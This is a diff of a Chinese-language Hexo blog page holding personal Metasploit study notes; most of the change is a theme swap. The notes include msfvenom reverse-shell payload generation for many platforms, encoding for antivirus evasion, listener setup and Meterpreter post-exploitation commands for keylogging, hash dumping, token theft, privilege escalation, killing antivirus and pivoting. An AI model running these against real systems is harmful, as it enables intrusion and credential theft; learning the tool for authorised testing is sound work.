@@ -1,395 +1,226 @@
-<!DOCTYPE HTML>
-<html lang="zh-CN">
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
 
 
 <head>
-    <meta charset="utf-8">
-	<meta name="referrer" content="unsafe-url">
-    <meta name="keywords" content="metasploit学习记录, wiki">
-    <meta name="description" content="">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="renderer" content="webkit|ie-stand|ie-comp">
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="format-detection" content="telephone=no">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <!-- Global site tag (gtag.js) - Google Analytics -->
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="booom">
+  <meta name="keywords" content="">
+  <title>metasploit学习记录 - wiki</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
 
-    <title>metasploit学习记录 | wiki</title>
-    <link rel="icon" type="image/png" href="/favicon.png">
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
 
-    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
-    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
-    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
-    <link rel="stylesheet" type="text/css" href="/css/matery.css">
-    <link rel="stylesheet" type="text/css" href="/css/my.css">
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
 
-    <script src="/libs/jquery/jquery.min.js"></script>
+  
 
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
 <meta name="generator" content="Hexo 4.2.0"></head>
 
 
 <body>
-    <header class="navbar-fixed">
-    <nav id="headNav" class="bg-color nav-transparent">
-        <div id="navContainer" class="nav-wrapper container">
-            <div class="brand-logo">
-                <a href="/" class="waves-effect waves-light">
-                    
-                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
-                    
-                    <span class="logo-span">wiki</span>
-                </a>
-            </div>
-            
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>wiki</strong>&nbsp;</a>
 
-<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
-<ul class="right nav-menu">
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/" class="waves-effect waves-light">
-      
-      <i class="fas fa-home" style="zoom: 0.6;"></i>
-      
-      <span>首页</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/archives" class="waves-effect waves-light">
-      
-      <i class="fas fa-archive" style="zoom: 0.6;"></i>
-      
-      <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li>
-    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
-      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
-    </a>
-  </li>
-</ul>
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
 
-
-<div id="mobile-nav" class="side-nav sidenav">
-
-    <div class="mobile-head bg-color">
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
         
-        <div class="logo-name">wiki</div>
-        <div class="logo-desc">
-            
-            Never really desperate, only the lost of the soul.
-            
-        </div>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
     </div>
+  </div>
+</nav>
 
-    
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
 
-    <ul class="menu-list mobile-menu-list">
-        
-        <li class="m-nav-item">
-	  
-		<a href="/" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-home"></i>
-			
-			首页
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/archives" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-archive"></i>
-			
-			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        
-    </ul>
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-09-01 17:23" pubdate>
+        2020年9月1日 下午
+      </time>
+    </span>
+  
 </div>
 
-
-        </div>
-
-        
-    </nav>
-
-</header>
-
+<div class="mt-1">
+  
     
-<script src="/libs/cryptojs/crypto-js.min.js"></script>
-<script>
-    (function() {
-        let pwd = '';
-        if (pwd && pwd.length > 0) {
-            if (pwd !== CryptoJS.SHA256(prompt('本文章暂不公开')).toString(CryptoJS.enc.Hex)) {
-                alert('密码错误，将返回主页！');
-                location.href = '/';
-            }
-        }
-    })();
-</script>
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.7k 字
+    </span>
+  
 
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      23
+       分钟
+    </span>
+  
 
-
-
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://i1.wp.com/sprotechs.com/wp-content/uploads/2019/06/install-Metasploit-in-termux-2019.jpg?resize=820%2C480&ssl=1')">
-    <div class="container" style="right: 0px;left: 0px;">
-        <div class="row">
-            <div class="col s12 m12 l12">
-                <div class="brand">
-                    <h1 class="description center-align post-title">metasploit学习记录</h1>
-                </div>
-            </div>
-        </div>
-    </div>
+  
+  
 </div>
 
+            
+          </div>
 
-
-
-<main class="post-container content">
-
-    
-    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
-<style>
-    #articleContent h1::before,
-    #articleContent h2::before,
-    #articleContent h3::before,
-    #articleContent h4::before,
-    #articleContent h5::before,
-    #articleContent h6::before {
-        display: block;
-        content: " ";
-        height: 100px;
-        margin-top: -100px;
-        visibility: hidden;
-    }
-
-    #articleContent :focus {
-        outline: none;
-    }
-
-    .toc-fixed {
-        position: fixed;
-        top: 64px;
-    }
-
-    .toc-widget {
-        width: 345px;
-        padding-left: 20px;
-    }
-
-    .toc-widget .toc-title {
-        margin: 35px 0 15px 0;
-        padding-left: 17px;
-        font-size: 1.5rem;
-        font-weight: bold;
-        line-height: 1.5rem;
-    }
-
-    .toc-widget ol {
-        padding: 0;
-        list-style: none;
-    }
-
-    #toc-content {
-        height: calc(100vh - 250px);
-        overflow: auto;
-    }
-
-    #toc-content ol {
-        padding-left: 10px;
-    }
-
-    #toc-content ol li {
-        padding-left: 10px;
-    }
-
-    #toc-content .toc-link:hover {
-        color: #42b983;
-        font-weight: 700;
-        text-decoration: underline;
-    }
-
-    #toc-content .toc-link::before {
-        background-color: transparent;
-        max-height: 25px;
-
-        position: absolute;
-        right: 23.5vw;
-        display: block;
-    }
-
-    #toc-content .is-active-link {
-        color: #42b983;
-    }
-
-    #floating-toc-btn {
-        position: fixed;
-        right: 15px;
-        bottom: 76px;
-        padding-top: 15px;
-        margin-bottom: 0;
-        z-index: 998;
-    }
-
-    #floating-toc-btn .btn-floating {
-        width: 48px;
-        height: 48px;
-    }
-
-    #floating-toc-btn .btn-floating i {
-        line-height: 48px;
-        font-size: 1.4rem;
-    }
-</style>
-<div class="row">
-    <div id="main-content" class="col s12 m12 l9">
-        <!-- 文章内容详情 -->
-<div id="artDetail">
-    <div class="card">
-        <div class="card-content article-info">
-            <div class="row tag-cate">
-                <div class="col s7">
-                    
-                    <div class="article-tag">
-                        
-                            <a href="/tags/metasploit/">
-                                <span class="chip bg-color">metasploit</span>
-                            </a>
-                        
-                    </div>
-                    
-                </div>
-                <div class="col s5 right-align">
-                    
-                </div>
-            </div>
-
-            <div class="post-info">
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-09-01
-                </div>
-                
-
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-09-02
-                </div>
-                
-
-                
-                <div class="info-break-policy">
-                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.7k
-                </div>
-                
-
-                
-                <div class="info-break-policy">
-                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    7 分
-                </div>
-                
-
-                
-                    <div id="busuanzi_container_page_pv" class="info-break-policy">
-                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv"></span>
-                    </div>
-				
-            </div>
+          
         </div>
-        <hr class="clearfix">
-        <div class="card-content article-card-content">
-            <div id="articleContent">
-                <h1 id="metasploit-学习记录"><a href="#metasploit-学习记录" class="headerlink" title="metasploit 学习记录"></a>metasploit 学习记录</h1><p><code>Metasploit</code>就是一个漏洞框架。它的全称叫做<code>The Metasploit Framework</code>，简称叫做<code>MSF</code>。<code>Metasploit</code>作为全球最受欢迎的工具，</p>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">metasploit学习记录</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="metasploit-学习记录"><a href="#metasploit-学习记录" class="headerlink" title="metasploit 学习记录"></a>metasploit 学习记录</h1><p><code>Metasploit</code>就是一个漏洞框架。它的全称叫做<code>The Metasploit Framework</code>，简称叫做<code>MSF</code>。<code>Metasploit</code>作为全球最受欢迎的工具，</p>
 <p>不仅仅是因为它的方便性和强大性，更重要的是它的框架。它允许使用者开发自己的漏洞脚本，从而进行测试。</p>
 <h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>终端直接输入msfconsole</p>
 <blockquote>
@@ -402,12 +233,12 @@
 <li><p>首先启动postgresql数据库：/etc/init.d/postgresql start；或者 service postgresql start；</p>
 </li>
 <li><p>初始化MSF数据库（关键步骤！）：msfdb init；</p>
-<p><img src="https://s1.ax1x.com/2020/09/01/dxJmSs.png" alt="dxJmSs.png"></p>
+<p><img src="https://s1.ax1x.com/2020/09/01/dxJmSs.png" srcset="/img/loading.gif" alt="dxJmSs.png"></p>
 </li>
 <li><p>运行msfconsole：msfconsole；</p>
 </li>
 <li><p>在msf中查看数据库连接状态：db_status。</p>
-<p><img src="https://s1.ax1x.com/2020/09/01/dxJGY4.png" alt="dxJGY4.png"></p>
+<p><img src="https://s1.ax1x.com/2020/09/01/dxJGY4.png" srcset="/img/loading.gif" alt="dxJGY4.png"></p>
 </li>
 <li><p>建立数据库缓存:<code>msfconsole db_rebuild_cache</code></p>
 </li>
@@ -417,64 +248,74 @@
 <p>将数据库初始化    msfdb init </p>
 <p>重建缓存    db_rebuild_cache    //This command is deprecated with Metasploit 5</p>
 </blockquote>
-<p><img src="https://s1.ax1x.com/2020/09/01/dxJste.png" alt="dxJste.png"></p>
+<p><img src="https://s1.ax1x.com/2020/09/01/dxJste.png" srcset="/img/loading.gif" alt="dxJste.png"></p>
 <h2 id="专业术语"><a href="#专业术语" class="headerlink" title="专业术语"></a>专业术语</h2><p><code>exploit</code>就相当于是载具，将真正要负责攻击的代码传送到靶机中。</p>
 <p><code>payload</code>也就相当于载荷。<code>exploit</code>把<code>payload</code>传送到靶机中后，<code>payload</code>就负责执行相应的攻击代码。</p>
 <p><code>encode</code>也就是编码，它主要是为了避免之前的<code>payload</code>中出现坏字符，从而影响<code>payload</code>的功能，其次是为了实现免杀，不让杀毒软件很轻易的就发现<code>payload</code>是攻击代码。</p>
-<pre><code>– Exploit，攻击工具/代码 
+<pre><code class="hljs coq">– Exploit，攻击工具/代码 
 – Payload，攻击载荷 
 – Shellcode 
-– Module，模块 
-– Listener，监听器</code></pre><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><pre><code>show exploits – 查看所有可用的渗透攻击程序代码，一般用不到，了解即可。 
-show auxiliary – 查看所有可用的辅助攻击工具 
-show options – 查看该模块所有可用选项 
-show payloads – 查看该模块适用的所有载荷代码 
-show targets – 查看该模块适用的攻击目标类型
-search – 根据关键字搜索某模块 
-info – 显示某模块的详细信息 
-use – 进入使用某渗透攻击模块 
-back – 回退 
-set/unset – 设置/禁用模块中的某个参数 
-setg/unsetg – 设置/禁用适用于所有模块的全局参数 
-save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</code></pre><h2 id="Metasploit功能程序"><a href="#Metasploit功能程序" class="headerlink" title="Metasploit功能程序"></a>Metasploit功能程序</h2><p><code>msfvenom</code>（攻击载荷生成和编码器）</p>
-<pre><code>主要参数：
--p payload
--e 编码方式
--i 编码次数
--o 保存payload到文件
--b 在生成的程序中避免出现的值
+– <span class="hljs-keyword">Module</span>，模块 
+– Listener，监听器</code></pre>
+
+<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><pre><code class="hljs properties"><span class="hljs-attr">show</span> <span class="hljs-string">exploits – 查看所有可用的渗透攻击程序代码，一般用不到，了解即可。 </span>
+<span class="hljs-attr">show</span> <span class="hljs-string">auxiliary – 查看所有可用的辅助攻击工具 </span>
+<span class="hljs-attr">show</span> <span class="hljs-string">options – 查看该模块所有可用选项 </span>
+<span class="hljs-attr">show</span> <span class="hljs-string">payloads – 查看该模块适用的所有载荷代码 </span>
+<span class="hljs-attr">show</span> <span class="hljs-string">targets – 查看该模块适用的攻击目标类型</span>
+<span class="hljs-attr">search</span> <span class="hljs-string">– 根据关键字搜索某模块 </span>
+<span class="hljs-attr">info</span> <span class="hljs-string">– 显示某模块的详细信息 </span>
+<span class="hljs-attr">use</span> <span class="hljs-string">– 进入使用某渗透攻击模块 </span>
+<span class="hljs-attr">back</span> <span class="hljs-string">– 回退 </span>
+<span class="hljs-meta">set/unset</span> <span class="hljs-string">– 设置/禁用模块中的某个参数 </span>
+<span class="hljs-meta">setg/unsetg</span> <span class="hljs-string">– 设置/禁用适用于所有模块的全局参数 </span>
+<span class="hljs-attr">save</span> <span class="hljs-string">– 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</span></code></pre>
+
+<h2 id="Metasploit功能程序"><a href="#Metasploit功能程序" class="headerlink" title="Metasploit功能程序"></a>Metasploit功能程序</h2><p><code>msfvenom</code>（攻击载荷生成和编码器）</p>
+<pre><code class="hljs diff">主要参数：
+<span class="hljs-deletion">-p payload</span>
+<span class="hljs-deletion">-e 编码方式</span>
+<span class="hljs-deletion">-i 编码次数</span>
+<span class="hljs-deletion">-o 保存payload到文件</span>
+<span class="hljs-deletion">-b 在生成的程序中避免出现的值</span>
 LHOST,LPORT 监听上线的主机IP和端口
--f exe 生成EXE格式
+<span class="hljs-deletion">-f exe 生成EXE格式</span>
 使用msfvenom -l 可以查看可以利用payload
-msfvenom -l | grep windows | grep x64 | grep tcp  选择payload</code></pre><p><strong>1、生成可执行文件</strong></p>
-<pre><code>Linux:
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf
+msfvenom -l | grep windows | grep x64 | grep tcp  选择payload</code></pre>
+
+<p><strong>1、生成可执行文件</strong></p>
+<pre><code class="hljs routeros">Linux:
+msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f elf &gt; shell.elf
 Windows:
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f exe &gt; shell.exe
 Mac:
-msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho
+msfvenom -p osx/x86/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f macho &gt; shell.macho
 PHP:
-msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php
-cat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php
+msfvenom -p php/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.php
+cat shell.php | pbcopy &amp;&amp; echo <span class="hljs-string">'&lt;?php '</span> | tr -d <span class="hljs-string">'\n'</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php
 ASP:
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp
+msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f asp &gt; shell.asp
 JSP:
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.jsp
 WAR:
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war
+msfvenom -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f war &gt; shell.war
 Python:
-msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py
+msfvenom -p cmd/unix/reverse_python <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.py
 Bash:
-msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh
+msfvenom -p cmd/unix/reverse_bash <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.sh
 Perl:
-msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</code></pre><p><strong>2、监听</strong></p>
-<pre><code>set PAYLOAD &lt;Payload name&gt;
-set LHOST &lt;LHOST value&gt;
-set LPORT &lt;LPORT value&gt;
-set ExitOnSession false   让connection保持连接(即使一个连接退出,仍然保持listening状态)
-exploit -j –z  -j(作为job开始运行)和-z(不立即进行session交换--也即是自动后台运行)</code></pre><p><strong>3、查找攻击模块</strong></p>
+msfvenom -p cmd/unix/reverse_perl <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.pl</code></pre>
+
+<p><strong>2、监听</strong></p>
+<pre><code class="hljs pgsql"><span class="hljs-keyword">set</span> PAYLOAD &lt;Payload <span class="hljs-type">name</span>&gt;
+<span class="hljs-keyword">set</span> LHOST &lt;LHOST <span class="hljs-keyword">value</span>&gt;
+<span class="hljs-keyword">set</span> LPORT &lt;LPORT <span class="hljs-keyword">value</span>&gt;
+<span class="hljs-keyword">set</span> ExitOnSession <span class="hljs-keyword">false</span>   让<span class="hljs-keyword">connection</span>保持连接(即使一个连接退出,仍然保持listening状态)
+exploit -j –z  -j(作为job开始运行)和-z(不立即进行<span class="hljs-keyword">session</span>交换<span class="hljs-comment">--也即是自动后台运行)</span></code></pre>
+
+<p><strong>3、查找攻击模块</strong></p>
 <p><code>search cve:CVE-2012-2122</code></p>
-<p><img src="https://s1.ax1x.com/2020/09/01/dxJh0f.png" alt="dxJh0f.png"></p>
+<p><img src="https://s1.ax1x.com/2020/09/01/dxJh0f.png" srcset="/img/loading.gif" alt="dxJh0f.png"></p>
 <p>详细信息查看<code>search -h</code></p>
 <p><strong>4、使用攻击模块</strong></p>
 <p><code>use Name</code></p>
@@ -490,856 +331,373 @@ exploit -j –z  -j(作为job开始运行)和-z(不立即进行session交换--�
 <p><code>exploit</code></p>
 <h2 id="Meterpreter后攻击"><a href="#Meterpreter后攻击" class="headerlink" title="Meterpreter后攻击"></a>Meterpreter后攻击</h2><p><code>Meterpreter</code>提供的功能包括反追踪、纯内存工作模式、系统 信息获取、密码哈希导出、文件上传下载、屏幕截取、键盘记 录、权限提升、跳板攻击等等。</p>
 <p>常用命令：</p>
-<pre><code>meterpreter &gt; background  放回后台
-meterpreter &gt; exit  关闭会话
-meterpreter &gt; help  帮助信息
-meterpreter &gt; Sysinfo系统平台信息
-meterpreter &gt; screenshot  屏幕截取
-meterpreter &gt; shell  命令行shell (exit退出)
-meterpreter &gt; getlwd  查看本地目录
-meterpreter &gt; lcd  切换本地目录
-meterpreter &gt; getwd  查看目录
-meterpreter &gt; ls 查看文件目录列表
-meterpreter &gt; cd  切换目录 
-meterpreter &gt; rm  删除文件 
-meterpreter &gt; download C:\\Users\\123\\Desktop\\1.txt 1.txt 下载文件
-meterpreter &gt; upload /var/www/wce.exe wce.exe  上传文件
-meterpreter &gt; search -d c:  -f *.doc  搜索文件
-meterpreter &gt; execute -f  cmd.exe -i   执行程序/命令 
-meterpreter &gt; ps  查看进程
-meterpreter &gt; run post/windows/capture/keylog_recorder   键盘记录
-meterpreter &gt; getuid  查看当前用户权限
-meterpreter &gt; use priv  加载特权模块
-meterpreter &gt; getsystem  提升到SYSTEM权限
-meterpreter &gt; hashdump  导出密码散列
-meterpreter &gt; ps   查看高权限用户PID
-meterpreter &gt; steal_token &lt;PID&gt;  窃取令牌
-meterpreter &gt; rev2self  恢复原来的令牌 
-meterpreter &gt; migrate pid  迁移进程
-meterpreter &gt; run killav  关闭杀毒软件 
-meterpreter &gt; run getgui-e  启用远程桌面
-meterpreter &gt; portfwd add -l 1234 -p 3389 -r &lt;目标IP&gt;  端口转发
-meterpreter &gt; run get_local_subnets  获取内网网段信息
-meterpreter &gt; run autoroute -s &lt;内网网段&gt;  创建自动路由
-meterpreter &gt; run autoroute -p  查看自动路由表
-创建代理通道:
-msf &gt; use auxiliary/server/socks4a   设置socks4代理模块
-msf auxiliary(socks4a) &gt; show options 
-msf auxiliary(socks4a) &gt; run
-配置proxychains参数：
-nano /etc/proxychains.conf   修改代理监听端口,和前面端口一致
-quite_mode  设置成安静模式：去掉如下参数前面的注释</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://xz.aliyun.com/t/3007" target="_blank" rel="noopener">https://xz.aliyun.com/t/3007</a></p>
+<pre><code class="hljs properties"><span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; background  放回后台</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; exit  关闭会话</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; help  帮助信息</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; Sysinfo系统平台信息</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; screenshot  屏幕截取</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; shell  命令行shell (exit退出)</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; getlwd  查看本地目录</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; lcd  切换本地目录</span>
+<span class="hljs-attr">meterpreter</span> <span class="hljs-string">&gt; getwd  查看目录</span>
